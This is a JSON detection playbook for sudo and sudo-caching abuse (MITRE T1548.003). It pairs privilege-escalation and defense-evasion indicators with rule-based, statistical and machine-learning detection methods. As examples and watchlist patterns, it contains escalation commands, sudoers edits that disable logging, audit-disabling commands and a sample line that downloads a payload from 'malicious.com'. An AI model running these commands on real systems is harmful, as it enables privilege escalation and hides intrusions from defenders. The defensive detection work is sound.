[
  {
    "information_requirement": "Has an adversary escalated privileges by abusing sudo or sudo caching mechanisms?",
    "tactic_id": "TA0004",
    "tactic_name": "Privilege Escalation",
    "indicators": [
      {
        "technique_id": "T1548.003",
        "name": "Sudo and Sudo Caching",
        "evidence": [
          {
            "description": "A `sudo` process is executed where the binary's file hash matches a known malicious signature, or the parent process is anomalous (e.g., a web server daemon or a process with an active external network connection).",
            "data_sources": [
              "Process Creation Logs (e.g., Auditd type=execve, Sysmon for Linux Event ID 1)",
              "File Creation Logs",
              "Zeek conn.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Critical Linux/macOS servers (e.g., web, database, authentication), Developer and administrator workstations",
            "action": [
              "1. (Symbolic) Continuously monitor process creation logs for `sudo` executions. Upon detection, compute the SHA256 hash of the executed binary. Compare this hash against a threat intelligence feed of known malicious file hashes. Generate a high-severity alert on any match.",
              "2. (Statistical) From process creation logs, build a 30-day baseline of parent processes that spawn `sudo`. Calculate the frequency distribution of these parent processes (e.g., `bash`, `zsh`, `sshd`). Generate an alert when a `sudo` command is executed by a parent process that falls in the bottom 5th percentile of frequency or is entirely new, with a specific focus on web server processes like `nginx` or `apache2`.",
              "3. (Machine Learning) Train a logistic regression classifier using labeled historical `sudo` events. Features should include the parent process name (one-hot encoded), the user account, presence of a TTY, and the command executed. Deploy the model to score new `sudo` events in real-time, generating an alert for any event classified with a high probability of being malicious (e.g., > 0.85)."
            ]
          },
          {
            "description": "A `sudo` command is executed with command-line arguments indicative of Living-off-the-Land (LOLBin) abuse, such as creating a reverse shell, loading a malicious shared object, or executing arbitrary code (e.g., `sudo find . -exec /bin/sh \\;`, `sudo LD_PRELOAD=/tmp/evil.so id`).",
            "data_sources": [
              "Process Creation Logs with command-line arguments (e.g., Auditd, Sysmon for Linux Event ID 1)",
              "Sudo Logs (/var/log/auth.log or equivalent with `log_input`/`log_output` enabled in sudoers)"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "All Linux/macOS endpoints and servers with `sudo` installed",
            "action": [
              "1. (Symbolic) Deploy a SIEM rule using regular expressions to scan the command-line arguments of all `sudo` executions. The regex should target patterns of LOLBin abuse (e.g., `sudo (nmap|find|awk|perl|python) .*(-c|--interactive|BEGIN \\{system\\()`) and environment variable manipulation for shared object loading (e.g., `sudo LD_.*=`).",
              "2. (Statistical) For all `sudo` commands, calculate the Shannon entropy of the full command-line string. Establish a per-user and per-system baseline of typical command entropy scores. Generate an alert when a command's entropy score exceeds 3 standard deviations above the user's or system's established mean, suggesting obfuscation or complex, non-standard commands.",
              "3. (Machine Learning) Vectorize the command-line arguments of `sudo` executions using TF-IDF. Apply a density-based clustering algorithm like DBSCAN to the vectorized data. This will group legitimate, repetitive administrative commands. Flag any command that the model classifies as a noise point (i.e., does not belong to any cluster) as an anomaly for analyst review."
            ]
          },
          {
            "description": "A `sudo` command is executed by a user account that has never executed `sudo` before, or the command itself is statistically rare for that user's established baseline of activity.",
            "data_sources": [
              "Process Creation Logs (e.g., Auditd with auid vs euid, Sysmon for Linux Event ID 1)",
              "Authentication Logs (/var/log/secure, /var/log/auth.log)",
              "Zeek ssh.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Authentication servers, Identity and Access Management systems, All Linux/macOS endpoints",
            "action": [
              "1. (Symbolic) Maintain an explicit allow-list of users/groups authorized for `sudo` access based on parsing the `/etc/sudoers` configuration. Monitor audit logs for any `sudo` execution where the executing user (`auid` in auditd) is not on the authorized list and generate a high-severity alert.",
              "2. (Statistical) For each authorized `sudo` user, build a historical profile of the commands they execute over a 90-day period. Create a frequency distribution of their commands. Alert when a user executes a command that is in the bottom 5% of their command frequency (a 'rare' command for them) or a command they have never run before.",
              "3. (Machine Learning) Implement a time-series anomaly detection model (e.g., ARIMA or Prophet) on the volume of `sudo` commands per user, per hour. An alert is triggered if the observed volume for a user suddenly spikes beyond the model's predicted forecast range, which could indicate automated abuse or credential compromise."
            ]
          },
          {
            "description": "Multiple `sudo` commands are executed from a non-interactive shell (e.g., where the process tty field is null) within the `sudo` credential cache timeout window (typically 5-15 minutes), following an initial interactive `sudo` execution.",
            "data_sources": [
              "Process Creation Logs (e.g., Auditd with tty field, Sysmon for Linux Event ID 1 with TerminalSessionId)",
              "File Access Monitoring Logs for /var/db/sudo/ or /var/run/sudo/ts/"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "All Linux/macOS hosts, particularly multi-user servers, Cron job and script execution environments",
            "action": [
              "1. (Symbolic) Create a stateful rule that detects a `sudo` process creation event where the `tty` field is null or absent. This rule should only trigger if the same user, on the same host, executed a `sudo` command WITH a `tty` field present within the last 15 minutes. This specifically targets non-interactive cache abuse.",
              "2. (Statistical) For each user, calculate the time delta between consecutive `sudo` commands. A sudden shift in the distribution towards a high frequency of short-delta executions (< 60 seconds), especially when correlated with non-interactive sessions, is anomalous. Alert when the median time delta for a user drops below the 10th percentile of their historical median.",
              "3. (Machine Learning) Use a Hidden Markov Model (HMM) where states are 'Interactive Sudo', 'Non-Interactive Sudo', and 'No Sudo'. Train the model on normal user behavior sequences. A transition from 'Interactive Sudo' to a rapid sequence of 'Non-Interactive Sudo' states with a high probability would be flagged as an anomalous sequence indicative of cache abuse."
            ]
          }
        ]
      }
    ],
    "version": "2.3",
    "date_created": "2025-05-04",
    "last_updated": "2025-09-30",
    "contributors": [
      "Zachary Szewczyk",
      "Ask Sage"
    ]
  },
  {
    "information_requirement": "Is an adversary evading defenses by modifying `sudo` configurations or its logging behavior?",
    "tactic_id": "TA0005",
    "tactic_name": "Defense Evasion",
    "indicators": [
      {
        "technique_id": "T1548.003",
        "name": "Sudo and Sudo Caching",
        "evidence": [
          {
            "description": "The `/etc/sudoers` file or a file within `/etc/sudoers.d/` is modified to include strings intended to disable logging, such as `!audit`, `!syslog`, or `logfile=/dev/null`.",
            "data_sources": [
              "File Integrity Monitoring (FIM) Logs",
              "File Modification Logs (e.g., Auditd syscall=write on /etc/sudoers and /etc/sudoers.d/)"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Configuration management servers (e.g., Ansible, Puppet, Chef), All Linux/macOS hosts",
            "action": [
              "1. (Symbolic) Deploy a FIM rule that alerts on any write or modification to `/etc/sudoers` or files in `/etc/sudoers.d/`. The rule must inspect the file content difference and trigger a high-severity alert if the added or modified lines contain the regex patterns `!audit`, `!syslog`, or `logfile=[\"']?/dev/null`.",
              "2. (Statistical) Baseline the rate of change for `sudoers` files across the environment; this rate should be near zero on most systems. Alert on any host whose `sudoers` change rate deviates by more than 2 standard deviations from its own 90-day baseline, especially if the change is not correlated with a configuration management system log entry or software patch event.",
              "3. (Machine Learning) Train a classification model (e.g., Random Forest) to distinguish between legitimate (e.g., change initiated by `puppet` or `ansible`) and suspicious (e.g., change initiated by `bash` or a web shell) `sudoers` file modifications. Features should include the parent process of the modifying process, user context, time of day, and the content of the change itself."
            ]
          },
          {
            "description": "The `/etc/sudoers` file or a file within `/etc/sudoers.d/` is modified to add or expand a `NOPASSWD` rule, or to add the `Defaults !tty_tickets` directive, relaxing security controls.",
            "data_sources": [
              "File Integrity Monitoring (FIM) Logs",
              "File Modification Logs (e.g., Auditd watching /etc/sudoers and /etc/sudoers.d/)",
              "Process Creation Logs (e.g., Sysmon for Linux Event ID 1)"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Configuration management servers, All Linux/macOS hosts, especially developer workstations and multi-user servers",
            "action": [
              "1. (Symbolic) Create a rule that triggers on FIM alerts for `sudoers` files. The rule logic must specifically search the change content for the addition of `NOPASSWD:` or `!tty_tickets`. Correlate this alert with a subsequent process execution of `killall Terminal` or `pkill -HUP sudo` by the same user within 5 minutes to increase confidence.",
              "2. (Statistical) Quantify the risk of `NOPASSWD` rules. Assign a risk score to each rule based on the user/group it applies to (e.g., `root`=10, `wheel`=8, `user`=5) and the commands allowed (`ALL`=10, specific binary=2). Monitor for changes that increase the aggregate `NOPASSWD` risk score for a system beyond a statically defined or learned threshold.",
              "3. (Machine Learning) Model the `sudoers` policy as a permissions graph where nodes are users, groups, and commands. A legitimate change might add a single, targeted edge (user -> command). A malicious change, like adding a broad `NOPASSWD: ALL` rule, creates a high-impact edge connecting a user to all commands. Use graph anomaly detection algorithms to detect such structurally significant changes."
            ]
          },
          {
            "description": "A `sudo` command is executed to disable a security service, clear logs, or disable shell history, such as `sudo systemctl stop auditd`, `sudo auditctl -e 0`, or `sudo history -c`.",
            "data_sources": [
              "Process Creation Logs with command-line arguments (e.g., Auditd, Sysmon for Linux Event ID 1)",
              "Zeek command.log",
              "Zeek notice.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Security infrastructure servers (e.g., SIEM forwarders, EDR management consoles), All Linux/macOS hosts",
            "action": [
              "1. (Symbolic) Maintain a watchlist of high-risk command strings related to defense evasion (e.g., `systemctl (stop|disable) auditd`, `auditctl -e 0`, `setenforce 0`, `history -c`, `set +o history`, `unset HISTFILE`). Create a SIEM rule to generate a critical alert whenever any of these command strings are executed via `sudo`.",
              "2. (Statistical) Profile the `sudo` command vocabulary for each system role (e.g., web server, database server). Identify the set of commands that constitute the top 95% of administrative activity for that role. Flag any `sudo` execution of a command that is not in this common command set with a high anomaly score.",
              "3. (Machine Learning) Use a sequence-to-sequence (seq2seq) model to learn normal sequences of administrative commands. An anomalous sequence, such as `sudo systemctl stop auditd` followed by `sudo wget http://malicious.com/payload.sh` and then `sudo chmod +x payload.sh`, would be flagged as a low-probability sequence indicative of an attack."
            ]
          },
          {
            "description": "A `sudo` command is executed from an unusual parent process (e.g., `apache2`, `nginx`) or contains heavily obfuscated arguments, such as multiple layers of Base64 encoding or character substitution.",
            "data_sources": [
              "Process Creation Logs with parent process info (e.g., Auditd, Sysmon for Linux Event ID 1)",
              "Zeek conn.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Internet-facing servers (e.g., web servers, API gateways), Application servers",
            "action": [
              "1. (Symbolic) Create a rule that alerts when the parent process name for a `sudo` execution is on a list of typically non-interactive or suspicious parents (e.g., `apache2`, `httpd`, `nginx`, `php-fpm`, `node`, `nc`). Correlate this with `Zeek conn.log` data to see if the parent process has active external network connections, increasing the alert severity.",
              "2. (Statistical) For each `sudo` command argument, calculate its character-level entropy. Alert if a command's argument entropy exceeds 3 standard deviations above the historical mean for that specific command (e.g., `apt-get install <package>`), indicating potential obfuscation of the argument value.",
              "3. (Machine Learning) Train a One-Class SVM on features of legitimate `sudo` executions (parent process name, user, command argument entropy, TTY presence). This model learns a boundary encapsulating normal activity. Any new execution that falls outside this learned boundary is classified as an anomaly, suitable for flagging novel or evasive `sudo` usage."
            ]
          }
        ]
      }
    ],
    "version": "2.3",
    "date_created": "2025-05-04",
    "last_updated": "2025-09-30",
    "contributors": [
      "Zachary Szewczyk",
      "Ask Sage"
    ]
  }
]